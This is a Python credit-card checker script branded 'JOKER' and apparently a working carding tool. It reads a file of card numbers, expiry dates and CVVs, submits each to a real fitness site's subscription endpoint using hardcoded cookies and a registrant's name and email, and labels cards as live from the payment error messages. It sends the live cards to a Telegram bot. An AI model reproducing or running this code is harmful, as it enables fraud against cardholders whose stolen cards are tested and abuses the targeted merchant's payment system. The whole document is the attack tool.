import requests
import pyfiglet,re
import os
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format('		JOKER ')
print(Z+logo)
o=("------------------------------------------------------------")
print(F+o)
combo=('jok.txt')
file=open(f'{combo}',"+r")
token = input(C+'ENTER TOKEN :'+X)
ID = input(B+'ENTER ID :'+F)
os.system('clear')
start_num = 0
for P in file.readlines():
    start_num += 1
    cc = P.split('|')[0]
    mes=P.split('|')[1]
    ano=P.split('|')[2][-2:]
    cvv=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    cookies = {
    '_ga': 'GA1.1.875480390.1710049692',
    'optiMonkClientId': '504e8819-178e-c103-408c-7936ef14e26d',
    '_gcl_au': '1.1.472210392.1710049692',
    'ci_session': 'elk921sljck7mqqojf60bmh0vbvts5om',
    '_ga_4HXMJ7D3T6': 'GS1.1.1710049691.1.1.1710050755.0.0.0',
    '_ga_KQ5ZJRZGQR': 'GS1.1.1710049692.1.1.1710050803.0.0.0',
}

    headers = {
    'authority': 'www.lagreeod.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_ga=GA1.1.875480390.1710049692; optiMonkClientId=504e8819-178e-c103-408c-7936ef14e26d; _gcl_au=1.1.472210392.1710049692; ci_session=elk921sljck7mqqojf60bmh0vbvts5om; _ga_4HXMJ7D3T6=GS1.1.1710049691.1.1.1710050755.0.0.0; _ga_KQ5ZJRZGQR=GS1.1.1710049692.1.1.1710050803.0.0.0',
    'origin': 'https://www.lagreeod.com',
    'referer': 'https://www.lagreeod.com/subscribe',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'stripe_customer': '',
    'subscription_type': 'Weekly Subscription',
    'firstname': 'Reda',
    'lastname': 'Hamo',
    'email': 'hamo16187@gmail.com',
    'password': 'hamo16187@gmail.com',
    'card[name]': 'Reda Hamo',
    'card[number]': cc,
    'card[exp_month]': mes,
    'card[exp_year]': ano,
    'card[cvc]': cvv,
    'coupon': '',
    's1': '9',
    'sum': '16',
}

    response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
    msg = response.json()['message']
    if "card has insufficient funds" in msg:
    	print(F+f'[ {start_num} ]',P,' ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅')
    	mgs1=f'''◆ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑪𝑨𝑹𝑫  ➜ {P}
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Low Balance + Live CVV 🟢 
━━━━━━━━━━━━━━━━━  
◆ 𝑩𝒀: @X1_H9 '''
    	tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs1}"
    	i = requests.post(tlg)
    elif "security code is incorrect" in msg:
    	print(F+f'[ {start_num} ]',P,' ➜ CCN ✅')
    	m1gs=f'''◆ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑪𝑨𝑹𝑫  ➜ {P}
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ CNN LIVE 🟢
━━━━━━━━━━━━━━━━━  
◆ 𝑩𝒀: @X1_H9 '''
    	t1lg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={m1gs}"
    	i = requests.post(t1lg)  
    else:
    	print(Z+f'[ {start_num} ]',P,' ➜ ', msg)